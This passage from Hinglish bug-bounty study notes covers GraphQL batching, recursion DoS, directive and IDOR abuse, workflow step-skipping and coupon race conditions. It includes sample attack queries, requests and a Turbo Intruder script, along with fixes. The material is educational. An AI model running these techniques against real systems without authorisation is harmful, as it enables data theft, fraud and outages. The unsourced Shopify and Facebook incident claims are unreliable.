- **Failure:** Server error de ki "Too many queries" ya "Batch limit exceeded". Ya response mein sirf kuch queries ka data aaye.

#### 9. ⚖️ Comparison: Batching vs Aliases
| Batching | Aliases |
|----------|---------|
| Multiple named operations | Single operation with multiple field aliases |
| Each query can be of different type | All fields must be from same root type (Query, Mutation) |
| Response mein alag-alag keys hote hain | Response mein aliases keys hote hain |
| Useful for mixing queries and mutations | Useful for multiple similar queries |

#### 10. 🚫 Common Mistakes
- Sirf aliases use karna, jabki mutations ko batch karne ke liye named operations chahiye.
- Bohot zyada queries bhej kar server crash kar dena (unintentional DoS) – responsible disclosure mein avoid karo.
- Rate limit bypass ka proof-of-concept mein yeh dikhana ki tumne 100 queries bheji aur wo sab successful rahin.

#### 11. 🤔 Agar Dimag Ghoom Rahe Hai?
- **"Kya ek request mein 100 queries bhejna illegal hai?"**
  Bug bounty mein generally allowed hai jab tak tum DoS na karo. Controlled testing karo.
- **"Mutations ko bhi batch kar sakte hain?"**
  Haan, mutations ko bhi named operations se batch kar sakte ho. Lekin mutations generally order-sensitive hote hain, isliye sequential execute honge.
- **"Batch limit kya honi chahiye?"**
  Ideally 5-10 queries per request se zyada nahi honi chahiye. Agar unlimited hai, toh vulnerable.

#### 12. 🌍 Real-World Use Case
**Example:** Shopify ke GraphQL API mein batching attack se rate limit bypass ho raha tha. Attacker ek request mein 100 queries bhej kar unlimited data fetch kar raha tha. Shopify ne ise fix kiya aur bounty diya.

#### 13. 🎨 Visual Diagram (ASCII Art)
```
Attacker --[1 HTTP request with 100 queries]--> GraphQL Server
                                               |
                                               v
                                  Execute 100 resolvers sequentially
                                               |
                                               v
                                      Database hits × 100
                                               |
                                               v
                                   High CPU/Memory → Slow response
```

#### 14. 🛠️ Best Practices (Pro Tips)
- **Automation:** Burp Intruder mein payload position rakh kar query count variable bana sakte ho.
- **Check for cost analysis:** Kuch servers query cost analyze karte hain – agar cost zyada hui toh reject kar dete hain.
- **Aliases se batching:** `u1: user(id:1) { ... } u2: user(id:2) { ... }` ye simple hai.

#### 15. ❓ FAQ
1. **Q: Batching attack se rate limit bypass kaise hota hai?**
   A: Server ek request count karta hai, lekin usme multiple queries hoti hain. Isliye effectively zyada operations ho jaate hain.
2. **Q: Aliases aur named operations mein kya farak hai?**
   A: Aliases ek hi query block mein multiple fields ke liye hote hain; named operations alag-alag query blocks hote hain.
3. **Q: Batching attack se DoS kaise karein?**
   A: 1000+ queries bhej kar server ko overload kar do. Lekin responsible disclosure mein mat karo.
4. **Q: Kya server batch queries ko parallel execute karta hai?**
   A: Generally sequential, but kuch implementations parallel bhi kar sakte hain, jisse aur zyada resource consumption.
5. **Q: Batching attack se bachne ke upaye?**
   A: Max queries per request limit lagao, cost analysis implement karo, rate limit ko operations per minute basis par lagao.

#### 16. 📝 Ek Line Mein Yaad Rakhne Ko
**"Batching se ek me multiple, rate limit ki fikar chhodo, server ko thakao."**

---

#### 5.2.2 Deep Recursion (Cyclical Queries)

#### 1. 🎯 Title: Deep Recursion – GraphQL Ki Bhagam Bhag Query Se Server Thakao

#### 2. 🐣 Samjhane ke liye (Analogy)
Ek **mirror room** mein do aaine ek dusre ke saamne rakh do – image infinite baar reflect hoti hai. Agar tum us room mein khade ho kar dekho, toh tumhe apne aap ki anant pratibimb dikhenge. GraphQL mein bhi agar schema mein cyclical relationships hain (jaise User ke friends jo khud User hain), toh tum aisi query bana sakte ho jo friends ke friends ke friends... ko recursively maangti rahe. Server har level par data fetch karta jaayega aur eventually memory exhaust ho jayegi.

#### 3. 📖 Technical Definition
Deep Recursion attack (cyclical query) mein attacker schema ke cyclical relationships ka fayda uthate hue ek deeply nested query bhejta hai. Har level par server naye database calls karta hai, jisse resource consumption badhta hai aur DoS ho sakti hai. GraphQL queries inherently nested ho sakti hain, isliye depth limit na ho to khatarnak.

#### 4. 🧠 Zaroorat Kyun Hai?
- **DoS:** Server ko itna deep query bhejo ki wo process nahi kar paaye aur crash ho jaye.
- **Data exposure:** Kabhi kabhi deep nesting mein sensitive data leak ho sakta hai jo normally surface level par nahi dikhta.

#### 5. 🔍 Visual - Screen Par Kya Dikhega
Query kuch aisi:
```graphql
query {
  user(id:1) {
    name
    friends {
      user {
        name
        friends {
          user {
            name
            friends {
              user {
                name
              }
            }
          }
        }
      }
    }
  }
}
```
Response time bahut high ho sakta hai ya server error de.

#### 6. ⚙️ Under the Hood
GraphQL resolver har field ke liye ek function hota hai. Agar query mein `friends` field recursively call ho rahi hai, to har level par resolver fir se call hoga, aur database se data fetch karega. Agar depth limit nahi hai, to ye chain bahut lambi ho sakti hai. Example: `friends` field resolve karne ke liye user ka data chahiye, aur us user ke friends ke liye fir se user resolve hoga, aage badhta jayega. Isse N+1 queries problem bhi trigger ho sakti hai.

#### 7. 💻 Hands-On Step-by-Step

**Step 1: Schema analysis**
- Pehle schema dekh kar cyclical relationships dhundho. Jaise `User` type ke andar `friends` field jo `[User]` return karta ho. Ya `Post` ke andar `author` jo `User` ho aur `User` ke andar `posts` ho.

**Step 2: Craft recursive query**
- Ek aisi query banao jisme nesting 5-10 levels tak ho.
- Example:
  ```graphql
  query {
    user(id:1) {
      friends {
        friends {
          friends {
            friends {
              friends {
                name
              }
            }
          }
        }
      }
    }
  }
  ```

**Step 3: Send query and monitor**
- Response time aur server behavior dekho. Agar response aane mein 10+ seconds lag rahe hain ya 500 error aaye, toh vulnerable.

**Step 4: Increase depth**
- Dheere-dheere depth badhao (10, 20, 50 levels). Lekin cautious raho ki server crash na ho jaye.

#### 8. ✅ Kaamyabi ki Nishani (Success vs Failure)
- **Success:** Response time abnormally high ho, ya server timeout/error de (e.g., `504 Gateway Timeout`, `500 Internal Server Error`, `Memory quota exceeded`).
- **Failure:** Server query execute kar de normal time mein, ya depth limit exceed hone par error de `"Query depth limit exceeded"`.

#### 9. ⚖️ Comparison: Depth Attack vs Batching
| Depth Attack | Batching Attack |
|--------------|-----------------|
| Ek query mein nesting | Ek request mein multiple queries |
| Target: Recursive resolvers | Target: Rate limiting & parallel execution |
| Resource consumption per query level | Resource consumption per query count |
| Schema structure par dependent | Independent of schema |

#### 10. 🚫 Common Mistakes
- Sirf nesting try karna, lekin cyclical relationships ki pehchaan na karna. Agar schema mein cycle nahi hai to deep query ka asar nahi hoga.
- Bohot deep query bhej kar server crash kar dena – responsible testing mein dheere-dheere depth badhao aur impact document karo.
- Response time ki jagah sirf error dekh kar conclusion nikal lena – kabhi kabhi server gracefully error de sakta hai.

#### 11. 🤔 Agar Dimag Ghoom Rahe Hai?
- **"Kya har schema mein cycle hoti hai?"**
  Nahi, but common patterns like `User -> friends -> User` ya `Post -> comments -> Post` mein cycle ho sakti hai.
- **"Agar depth limit 10 hai toh kya 11 level ki query bhejni chahiye?"**
  Haan, agar limit exceed ho to error aayega. Isse pata chalega ki limit hai aur kitni hai.
- **"Deep recursion se data leak kaise ho sakta hai?"**
  Agar koi field normally restricted hai (e.g., `email` sirf friends ko dikhti hai), to deep nesting mein authorization check miss ho sakta hai.

#### 12. 🌍 Real-World Use Case
**Example:** Facebook ki API mein ek bug tha jahan `friends` field recursively call kar sakte the. Attacker ne 10 levels deep query bheji to server slow ho gaya. Facebook ne depth limit implement ki.

#### 13. 🎨 Visual Diagram (ASCII Art)
```
Query: user -> friends -> user -> friends -> ...
          |        |         |        |
          v        v         v        v
        Resolver Resolver  Resolver Resolver
          |        |         |        |
          v        v         v        v
        DB call  DB call   DB call  DB call   → CPU/Memory ↑↑
```

#### 14. 🛠️ Best Practices (Pro Tips)
- **Check schema for cycles:** Introspection se cycles identify karo.
- **Gradual depth increase:** 5, 10, 15 levels bhejo aur response time graph banao.
- **Use timeout:** Agar request bahut slow ho, to Burp mein timeout setting adjust karo.
- **Automation:** GraphQLmap jaise tools mein depth fuzzing hoti hai.

#### 15. ❓ FAQ
1. **Q: Deep recursion attack ka pata kaise chalega?**
   A: Response time abnormal ho ya server crash ho.
2. **Q: Cyclical relationship ka matlab kya hai?**
   A: Type A ke andar field ho jo type A ko hi refer kare.
3. **Q: Kya depth limit hamesha hoti hai?**
   A: Production servers mein usually hoti hai, lekin ho sakta hai ki limit bahut high ho (e.g., 100).
4. **Q: Deep recursion se bachne ke upaye?**
   A: Depth limit lagao (e.g., max 10), query complexity analysis karo, pagination use karo.
5. **Q: Kya mutation mein bhi deep recursion possible hai?**
   A: Haan, agar mutation bhi objects return karta hai jo further nesting allow karte hain.

#### 16. 📝 Ek Line Mein Yaad Rakhne Ko
**"Cycle ho to recursion se khel, deep jaakar server ko dhele."**

---

#### 5.2.3 Directive-based Attacks (@include / @skip)

#### 1. 🎯 Title: Directive Attacks – Condition Check Ko Bypass Karke Data Uthao

#### 2. 🐣 Samjhane ke liye (Analogy)
Tum ek **online form** bhar rahe ho jisme ek question hai: "Kya tumhe newsletter chahiye?" Agar tum "haan" check karte ho to ek extra field dikhti hai "Email". Agar tum "nahi" check karte ho to wo field chhup jaati hai. Ab agar tum form ki URL mein kuch aise parameters change kar do ki wo field hamesha dikhe, chahe tumne "nahi" hi kyun na check kiya ho, to tum newsletter field ko force kar sakte ho. GraphQL mein `@include` aur `@skip` directives aise hi kaam karte hain – unke condition variables ko manipulate karke aap normally hidden fields ko dekh sakte ho.

#### 3. 📖 Technical Definition
GraphQL directives (`@include`, `@skip`) allow conditional inclusion/exclusion of fields based on variables. Attacker in variables ko manipulate karke aise fields ko access kar sakta hai jo normally kisi condition (jaise user role) ke basis par hide kiye jaate hain. Isse authorization bypass ho sakta hai.

#### 4. 🧠 Zaroorat Kyun Hai?
- **Authorization Bypass:** Agar koi field sirf admin ke liye visible hai, lekin us field par `@include(if: $isAdmin)` lagaa hai aur `$isAdmin` variable client se aata hai, to attacker `$isAdmin: true` bhej kar admin field access kar sakta hai.
- **Data Exfiltration:** Normally hidden sensitive data ko force display karna.

#### 5. 🔍 Visual - Screen Par Kya Dikhega
Query mein directives dikhenge:
```graphql
query($showEmail: Boolean!) {
  user {
    name
    email @include(if: $showEmail)
  }
}
```
Variables:
```json
{ "showEmail": false }
```
Response mein email nahi hoga. Attacker variable change karega `true` to email aa jayega.

#### 6. ⚙️ Under the Hood
GraphQL server query parse karte waqt directives ko evaluate karta hai. Agar `@include(if: $variable)` hai to server `$variable` ki value check karta hai. Agar true hai to field include karta hai, otherwise skip. Ye evaluation server-side hota hai, lekin variable ki value client se aati hai. Agar server ne variable ki value ko validate nahi kiya (jaise ki user ke permissions ke hisaab se), to attacker arbitrarily true/false set kar sakta hai.

#### 7. 💻 Hands-On Step-by-Step

**Step 1: Identify directives in schema**
- Introspection se pata karo ki kaunsi fields par directives use ho rahe hain. Fields ke definition mein directives mention ho sakte hain.
- Ya fir traffic mein koi aisi query dekho jisme `@include` ya `@skip` ho.

**Step 2: Understand the condition variable**
- Query mein variable define hoga, jaise `($showEmail: Boolean!)`.
- Normal request mein variable false ho sakta hai.

**Step 3: Manipulate the variable**
- Request bhejo with variable value `true`.
- Agar response mein wo field aa jaye, toh vulnerability hai.

**Step 4: Test other conditions**
- Agar variable kisi object se related ho (e.g., `$userRole`), to uski value change karke role-based fields access karo.

#### 8. ✅ Kaamyabi ki Nishani (Success vs Failure)
- **Success:** Field jo normally nahi aati thi, ab response mein aaye.
- **Failure:** Field nahi aati, ya server error de ki invalid variable.

#### 9. ⚖️ Comparison: @include vs @skip
| @include | @skip |
|----------|-------|
| Agar condition true ho to field include karo | Agar condition true ho to field skip karo |
| `@include(if: $var)` | `@skip(if: $var)` |
| var true -> field aayega | var true -> field nahi aayega |
| var false -> field nahi aayega | var false -> field aayega |

Dono ek hi cheez ke do opposite hain.

#### 10. 🚫 Common Mistakes
- Sirf `@include` ka sochna, `@skip` ko bhoolna.
- Variable manipulation ke baad bhi field na aaye to ignore kar dena – ho sakta hai server ne koi aur check lagaya ho.
- Yakeen na karna ki variable manipulation se kuch hoga, lekin kabhi kabhi server variable ki value par poora bharosa kar leta hai.

#### 11. 🤔 Agar Dimag Ghoom Rahe Hai?
- **"Kya directives sirf queries mein hote hain?"**
  Nahi, mutations mein bhi ho sakte hain.
- **"Agar variable boolean nahi hai, to kya kar sakte hain?"**
  Variable string, integer kuch bhi ho sakta hai. Us hisaab se values try karo.
- **"Directive attack se server-side code execution?"**
  Nahi, sirf data access hota hai. Lekin RCE nahi.

#### 12. 🌍 Real-World Use Case
**Example:** Ek social media API mein `user` query thi jisme `email` field par `@include(if: $isFriend)` lagaa tha. Attacker ne variable `isFriend: true` bhej kar kisi bhi user ka email nikal liya, bina friend hue.

#### 13. 🎨 Visual Diagram (ASCII Art)
```
Normal: query($isFriend:false) { user { email @include(if:$isFriend) } } → email missing
Attacker: query($isFriend:true) { user { email @include(if:$isFriend) } } → email included
```

#### 14. 🛠️ Best Practices (Pro Tips)
- **Burp Repeater:** Request capture karo, variables section mein values change karo.
- **Brute force variables:** Agar variable enum ho (jaise role: USER, ADMIN), to sab try karo.
- **Check for default values:** Query mein variable ka default value ho sakta hai – use bhi manipulate karo.

#### 15. ❓ FAQ
1. **Q: Directives ka use kis liye hota hai?**
   A: Client-side par conditional fields ke liye.
2. **Q: Directive attack se kaunsi vulnerability exploit hoti hai?**
   A: Authorization bypass, information disclosure.
3. **Q: Kya `@skip` ko bhi manipulate kar sakte hain?**
   A: Haan, agar condition true karo to field skip ho jayega. Kuch cases mein useful ho sakta hai.
4. **Q: Directive attack se bachne ke upaye?**
   A: Server-side par bhi authorization check karo, client ke variables par bharosa mat karo.
5. **Q: Kya directives schema mein defined hote hain?**
   A: Haan, schema mein directives define hote hain, but `@include`/`@skip` built-in hain.

#### 16. 📝 Ek Line Mein Yaad Rakhne Ko
**"Directive mein variable ki maari maar, true kar ke dekh le jo field thi bekaar."**

---

#### 5.2.4 GraphQL IDOR

#### 1. 🎯 Title: GraphQL IDOR – Global IDs Se Dusron Ka Data Churao

#### 2. 🐣 Samjhane ke liye (Analogy)
Tumhare society mein har ghar ka ek **unique number** hai (e.g., A-101, A-102). Tum apne ghar ka number dekar apna data le sakte ho. Lekin agar tum doosre ghar ka number de do aur server check nahi karta ki tum wahan ke rehne wale ho, to tum unka data le sakte ho. GraphQL mein often objects ke paas **global IDs** hote hain (jaise `VXNlcjox` base64 encoded). Agar authorization theek nahi hai, to tum kisi aur ka ID daal kar uska data le sakte ho. Yani IDOR.

#### 3. 📖 Technical Definition
GraphQL IDOR (Insecure Direct Object Reference) tab hota hai jab API kisi object ko access karne ke liye client se ID leta hai aur ye check nahi karta ki client us object ka authorized hai ya nahi. GraphQL mein often global unique identifiers use hote hain (e.g., base64 encoded strings), jo predictable ho sakte hain, jisse attacker dusre objects ke data access kar sakta hai.

#### 4. 🧠 Zaroorat Kyun Hai?
- **Horizontal privilege escalation:** Doosre users ka data dekhna.
- **Vertical privilege escalation:** Admin level objects access karna.
- **Data breach:** Sensitive information nikalna.

#### 5. 🔍 Visual - Screen Par Kya Dikhega
Query kuch aisi:
```graphql
query {
  user(id: "VXNlcjox") {
    name
    email
  }
}
```
Yahan `id` parameter hai. Attacker is ID ko change karke doosre users ki IDs daal sakta hai.

#### 6. ⚙️ Under the Hood
GraphQL resolvers mein developer aksar ID ko directly database query mein use kar leta hai bina authorization check ke. Jaise:
```javascript
resolve(parent, args, context) {
  return db.users.findById(args.id);  // No check if current user owns this id
}
```
Isse IDOR ho jata hai.

#### 7. 💻 Hands-On Step-by-Step

**Step 1: Identify ID parameters**
- Queries/mutations mein koi parameter jo object ki ID lega, jaise `id`, `userId`, `postId`.

**Step 2: Understand ID format**
- GraphQL often uses **global IDs** (specification ke hisaab se base64 encoded string, jaise `VXNlcjox` = `User:1`).
- Decode karo base64 se: `echo VXNlcjox | base64 -d` → `User:1`. Isme type aur database ID hota hai.
- Ya ho sakta hai integer ID ho directly.

**Step 3: Test with your own ID**
- Apna ID bhej kar normal response lo.

**Step 4: Change ID to another user's ID**
- Doosre user ka ID guess karo. Agar pattern `User:2` hai to `VXNlcjoy` banao.
- Agar integer ID hai to increment karo (1,2,3...).
- Request bhejo aur response dekho.

**Step 5: Check authorization**
- Agar doosre user ka data mil gaya, toh IDOR confirmed.

#### 8. ✅ Kaamyabi ki Nishani (Success vs Failure)
- **Success:** Doosre user ka data response mein aaye.
- **Failure:** Sirf apna data aaye, ya error aaye `"Unauthorized"` ya `"Not found"` (par not found bhi data leak kar sakta hai ki ID exist karti hai).

#### 9. ⚖️ Comparison: GraphQL IDOR vs REST IDOR
| GraphQL IDOR | REST IDOR |
|--------------|-----------|
| ID parameter in query/mutation | URL parameter (e.g., /api/users/1) |
| Global IDs often base64 encoded | Usually integer IDs |
| Single endpoint, multiple object types | Different endpoints for different objects |
| Complex nested queries can fetch related objects in one go | Multiple requests needed |

#### 10. 🚫 Common Mistakes
- Sirf integer IDs increment karna, base64 encoded IDs ko decode/encode karna bhoolna.
- Apni ID ke alawa doosre ki ID try karte waqt bina login kiye (if required) attempt karna – ho sakta hai authentication pehle ho.
- Response mein "not found" aane par sochna ki IDOR nahi hai – kabhi kabhi server 404 de sakta hai taaki existence na pata chale.

#### 11. 🤔 Agar Dimag Ghoom Rahe Hai?
- **"GraphQL mein global IDs kyun use hote hain?"**
  Taaki client ko object type aur ID ek saath mil jaye, aur caching aasan ho.
- **"Kya global IDs predictable hote hain?"**
  Usually base64 encoded, lekin underlying ID integer hai to predictable ho sakta hai. Agar UUID use ho raha hai to guess karna mushkil.
- **"IDOR ke liye sirf ID change karna kaafi hai?"**
  Nahi, authorization check bypass hona chahiye. Agar server check kar raha hai ki tum us user ke ho, to IDOR nahi hoga.

#### 12. 🌍 Real-World Use Case
**Example:** Facebook Graph API mein ek time par `user_id` parameter tha bina proper authorization ke. Attacker kisi aur ka ID daal kar unki photos dekh sakta tha. Facebook ne ise fix kiya.

#### 13. 🎨 Visual Diagram (ASCII Art)
```
Attacker: query { user(id: "VXNlcjoy") } → server checks db.findById(2) → returns data of user 2
Server should have checked: is requester allowed to see user 2?
```

#### 14. 🛠️ Best Practices (Pro Tips)
- **Decode global IDs:** Base64 decode karo aur pattern samjho. Agar `User:1` hai to `User:2` try karo.
- **Use Burp Intruder:** IDs ki range bhej kar fuzzing karo.
- **Check for indirect IDOR:** Kuch queries mein arguments nested objects mein ho sakte hain, jaise `posts(userId: 1)`.
- **Automation:** GraphQLmap mein IDOR detection module hai.

#### 15. ❓ FAQ
1. **Q: GraphQL IDOR detect karne ka sabse simple tareeka?**
   A: Apni ID se data le lo, phir doosre user ki ID (increment/decode) daal kar dekho.
2. **Q: Global ID decode kaise karein?**
   A: Base64 decode karo. Online tool ya command line: `echo "VXNlcjox" | base64 -d`.
3. **Q: Kya GraphQL mutations mein bhi IDOR ho sakta hai?**
   A: Haan, jaise `deletePost(id: "UG9zdDox")` – agar authorization check nahi hai to kisi aur ka post delete kar sakte ho.
4. **Q: Agar global ID UUID hai to kya karein?**
   A: Agar UUID random hai, toh guess karna mushkil. Lekin kabhi kabhi UUID bhi predictable ho sakta hai (e.g., version 1).
5. **Q: IDOR se bachne ke upaye?**
   A: Har request mein authorization check karo ki current user us resource ka owner hai ya us par permission hai.

#### 16. 📝 Ek Line Mein Yaad Rakhne Ko
**"IDOR ka khel, ID badal ke dekh, doosre ka data le le re."**

---

Ye raha **Module 5: GraphQL Security** ka complete, zero-confusion notes. Har topic ko 16-point structure mein tod-tod ke samjhaya gaya, bilkul aapki demand ke mutabik. Umeed hai ab GraphQL aapke liye koi raaz nahi rakhta.

========================================================================================

## 🔄 Module 6: Business Logic & Rate Limiting

Yeh module business logic mein chhupi hui vulnerabilities aur rate limiting ko bypass karne ke advanced techniques ke baare mein hai. Business logic flaws wo loopholes hote hain jo developers ne socha nahi tha, jaise step skip karna, ek hi coupon baar baar use karna, ya price negative karna. Rate limiting bypass se hum unlimited requests bhej sakte hain. Chaliye har topic ko detail mein samajhte hain.

---

### 🎯 Topic 6.1: Workflow Bypass (Step Skipping)

#### 1. 🎯 Title
**Workflow Bypass (Step Skipping)**

#### 2. 🐣 Samjhane ke liye (Analogy)
Sochiye aap ek bank mein loan lene gaye hain. Normal process: (1) Form bharo, (2) Document verify karo, (3) Manager se milo, (4) Loan mil jaye. Ab agar aap form bharne ke baad seedha Manager ke cabin mein ghus jao aur "Loan de do" bolo, aur woh de de—toh bank ka process flawed hai. Yahan pe **step 2 (document verification) skip** ho gaya. Waise hi API mein, agar signup process ke step 1 ke baad step 3 ka endpoint call karke success le li, toh vulnerability hai.

#### 3. 📖 Technical Definition
Workflow Bypass ek vulnerability hai jahan application ka intended multi-step process (jaise signup, payment, password reset) ko attacker bypass karke kisi intermediate step ko skip kar deta hai aur directly final step execute kar leta hai. Yeh aksar tab hota hai jab server properly state maintain nahi karta (e.g., session mein step completion flag nahi check karta) aur client-side logic par bharosa karta hai.

#### 4. 🧠 Zaroorat Kyun Hai?
Ye vulnerability business logic mein sabse common hai. Isse attacker unauthorized access ya privileges achieve kar sakta hai. Jaise:
- Signup mein OTP verify kiye bina account activate.
- Payment gateway skip karke product free mein le lena.
- Password reset ke final step par seedha pahunch kar password change.

#### 5. 🔍 Visual - Screen Par Kya Dikhega
- **Burp Suite** mein aap requests ko intercept karte hain.
- Signup process ke steps:
  - `POST /api/register` → (step 1) → response 200 OK.
  - `POST /api/verify-otp` → (step 2) → normally yahan jana chahiye.
  - `POST /api/success` → (step 3) → final step.
- Visual: Step 1 complete karne ke baad, aap **Repeater** mein seedha `/api/success` endpoint call karte hain.
- Agar response aaya `200 OK` with `{"message":"Welcome"}` toh vulnerable hai.

#### 6. ⚙️ Under the Hood
Server ko track karna chahiye ki user kis step par hai. Usually session ya JWT mein `step_completed` flag store hota hai. Har step ke endpoint par yeh flag check hota hai. Agar developer sirf frontend routing par rely karta hai aur backend par proper check nahi karta, toh step 3 ka endpoint direct accessible ho jata hai. Example code (vulnerable):
```python
@app.route('/api/success', methods=['POST'])
def success():
    # No check if user completed step2
    create_user_account()
    return {"message":"Success"}
```

#### 7. 💻 Hands-On Step-by-Step
Maano ek website hai: `https://target.com`

**Step 1:** Signup form fill karo (email, password) aur request intercept karo:
```
POST /api/register HTTP/1.1
Host: target.com
...
{"email":"test@test.com","password":"Test@123"}
```
Response: `{"status":"registered","user_id":123}`

**Step 2:** Ab normally OTP page aata hai. Lekin hum OTP page ko ignore karte hain.

**Step 3:** Directly success endpoint call karte hain. Agar URL guess karna ho toh common patterns:
- `/api/success`
- `/api/complete`
- `/api/finish`
- `/api/activate`
- `/signup/step3`

Burp Repeater mein bhejo:
```
POST /api/success HTTP/1.1
Host: target.com
Cookie: session=...
```
Ya body mein user_id bhej sakte hain:
```
{"user_id":123}
```

**Step 4:** Agar response `200 OK` aur account activate ho jaye, toh vulnerable hai.

**Force Browsing variant:** Step 2 ka endpoint `/api/verify-otp` par OTP maang raha hai. Lekin aap try karo `/api/verify-otp` ko bina OTP bheje? Ya step 3 ka URL seedha browser mein type karo.

#### 8. ✅ Kaamyabi ki Nishani (Success vs Failure)
- **Success Response:**
  `HTTP/1.1 200 OK` with `{"message":"Account activated","redirect":"/dashboard"}`
  Ya `302 Found` redirect to dashboard.
- **Failure Response:**
  `403 Forbidden` ya `401 Unauthorized` with `{"error":"OTP verification pending"}`
  Ya `302 redirect` back to OTP page.

#### 9. ⚖️ Comparison (Workflow Bypass vs IDOR)
| Workflow Bypass | IDOR |
|-----------------|------|
| Steps skip karna | Direct object reference (jaise user_id change) |
| Multi-step process ka flaw | Single endpoint par authorization flaw |
| Example: Signup step 3 direct access | Example: /api/user/123 mein 124 dalna |

#### 10. 🚫 Common Mistakes
- **Mistake:** Sirf ek step ka endpoint try karna. **Fix:** Saare steps ke URLs enumerate karo (directory brute-force).
- **Mistake:** Response par dhyan nahi dena. Kabhi `200 OK` aata hai but actual mein success nahi hota. Check karo ki account activate hua ya nahi (e.g., login try karo).
- **Mistake:** Session cookie ignore karna. Step skip ke baad bhi same session maintain karo.

#### 11. 🤔 Agar Dimag Ghoom Rahe Hai?
- **Q:** Agar step 2 mein OTP verify karna mandatory hai, toh step 3 ka direct access kyun allowed ho sakta hai?
  **A:** Kyunki developer ne sirf frontend routing ko hide kiya, backend par har endpoint independent hai. Step 2 ke endpoint ne user ko mark kiya "verified", but step 3 woh flag check karna bhool gaya.
- **Q:** Agar step 3 ka URL unknown hai toh kaise pata chalega?
  **A:** JavaScript files mein search karo (`/static/main.js`) ya common patterns guess karo. Tools like `Dirb` se directory brute-force kar sakte ho.

#### 12. 🌍 Real-World Use Case
**Bug Bounty Example:** Ek famous password reset bypass case: Password reset flow mein 3 steps the: (1) Email submit, (2) OTP verify, (3) New password set. Attacker ne step 1 complete kiya, OTP verify kiye bina seedha step 3 ka endpoint `/reset-password/confirm` call kiya with new password. Server ne bina OTP check kiye password change kar diya. Severity: Critical.

#### 13. 🎨 Visual Diagram (ASCII Art)
```
User -> POST /register (step1) -> Server (stores user pending)
User -> (skip step2) -> POST /success (step3) -> Server (check? no) -> Account activated
```

#### 14. 🛠️ Best Practices (Pro Tips)
- **Pro Tip 1:** Workflow enumeration ke liye Burp Intruder use karo with common step names (`/complete`, `/done`, `/final`).
- **Pro Tip 2:** Signup ya password reset ke baad server ka response carefully dekho. Kabhi hidden step URL response mein milta hai.
- **Pro Tip 3:** Agar API GraphQL hai toh introspection query se saare mutations pata karo.

#### 15. ❓ FAQ (Interview Questions)
- **Q1:** Workflow bypass vulnerability ka root cause kya hai?
  **A:** Server-side state validation ki kami. Developer sirf client-side flow par rely karta hai.
- **Q2:** Is vulnerability ko kaise prevent karein?
  **A:** Har step ke endpoint par check karo ki user ne previous step complete kiya hai ya nahi, using session or token.
- **Q3:** Workflow bypass aur privilege escalation mein kya antar hai?
  **A:** Workflow bypass steps skip karna, privilege escalation user level badalna (e.g., user to admin).

#### 16. 📝 Ek Line Mein Yaad Rakhne Ko
**"Process ke step skip kar ke final destination par pahunch jao—agar server rokega nahi toh account mil gaya."**

---

### 🎯 Topic 6.2: Race Conditions (Turbo Intruder)

#### 1. 🎯 Title
**Race Conditions (Turbo Intruder)**

#### 2. 🐣 Samjhane ke liye (Analogy)
Sochiye ek ladka ek ladki ko propose karta hai. Ladki ke paas do dost hain. Ek saath dono dost ladki se puchte hain: "Kya tumne haan kar di?" Ladki sochti hai "maine toh abhi haan nahi kiya" lekin dono ko separately "haan" bol deti hai. Baad mein pata chalta hai ki dono ne haan maan li. Yeh race condition hai: ek hi resource (ladki ka reply) par ek saath multiple requests ne overlapping condition create kar di.

API mein, jab do ya zyada concurrent requests ek hi resource (jaise coupon, balance) ko modify karne ki koshish karte hain, aur server proper locking nahi karta, toh "race" hoti hai.

#### 3. 📖 Technical Definition
Race Condition ek vulnerability hai jahan ek system ki behavior timing par depend karta hai. Multiple threads ya processes ek shared resource ko access karte hain bina proper synchronization ke. Iski wajah se unexpected state aati hai—jaise ek coupon multiple baar apply ho jana, ya ek account se double withdrawal.

#### 4. 🧠 Zaroorat Kyun Hai?
Is vulnerability se financial loss ho sakta hai. Jaise:
- Ek limited-use coupon baar baar use karke heavy discount.
- Bank account se ek saath multiple withdrawals karke zyada paisa nikalna.
- Voting system mein ek user multiple votes daal de.
- E-commerce mein ek product ki quantity se zyada order kar lena.

#### 5. 🔍 Visual - Screen Par Kya Dikhega
Burp Suite mein **Turbo Intruder** extension install karna hoga. Jab aap request bhejte hain:
- Normal request: `POST /apply-coupon` with `coupon=SAVE50` → response: `{"success":true,"new_total":50}`
- Race condition test: Turbo Intruder se 50 concurrent requests bhejo same coupon ke saath.
- Agar response mein multiple `success:true` aaye, ya total bill 50 se kam ho jaye, toh vulnerable.

#### 6. ⚙️ Under the Hood
Server code kuch aisa hota hai (vulnerable):
```python
def apply_coupon(user_id, coupon):
    coupon_data = db.query("SELECT * FROM coupons WHERE code=? AND used_by IS NULL", coupon)
    if coupon_data:
        # Step 1: check if coupon available
        # Step 2: apply discount
        # Step 3: mark coupon as used
        db.execute("UPDATE coupons SET used_by=? WHERE code=?", user_id, coupon)
```
Race condition tab hoti hai jab do requests ek saath step 1 par pahunchti hain, dono dekhti hain coupon available hai, phir dono step 2 apply karti hain, phir step 3 update karti hain. Par step 3 ke time tak coupon do baar use ho chuka.

#### 7. 💻 Hands-On Step-by-Step
**Prerequisite:** Burp Suite Community/Pro, Turbo Intruder extension installed.

**Step 1:** Target endpoint identify karo jahan limited-use coupon ya ek baar ka action ho raha ho. Example: `POST /cart/apply-coupon`.

**Step 2:** Normal request capture karo aur send to Turbo Intruder (right-click → Extensions → Turbo Intruder → Send to Turbo Intruder).

**Step 3:** Python script edit karo. Default script hai:
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=100,
                           pipeline=False
                           )
    for i in range(50):   # 50 concurrent requests
        engine.queue(target.req)
```
ConcurrentConnections badha sakte hain (e.g., 20) for more race.

**Step 4:** Attack run karo. Response tab mein multiple responses aayenge.

**Step 5:** Analyze karo. Agar kisi bhi response mein `success:true` multiple baar aaya, toh coupon multiple baar apply hua. Check karo ki final cart total kitna hai (cart total endpoint call karke).

**Turbo Intruder script with custom headers:** Agar request mein CSRF token ho toh usse handle karna padega. Use `target.req` as base and modify.

#### 8. ✅ Kaamyabi ki Nishani (Success vs Failure)
- **Success:** Multiple requests par `200 OK` with `{"success":true}`. Ya final total unexpectedly low.
- **Failure:** Sirf pehli request success, baaki sab `400 Bad Request` with `{"error":"Coupon already used"}`.

#### 9. ⚖️ Comparison (Race Condition vs Replay Attack)
| Race Condition | Replay Attack |
|----------------|---------------|
| Concurrent requests ek saath bhejna | Same request baad mein dubara bhejna |
| Timing vulnerability | Storage vulnerability (nonce missing) |
| Coupon ek hi time pe multiple baar use | Already used coupon dubara bhejna |

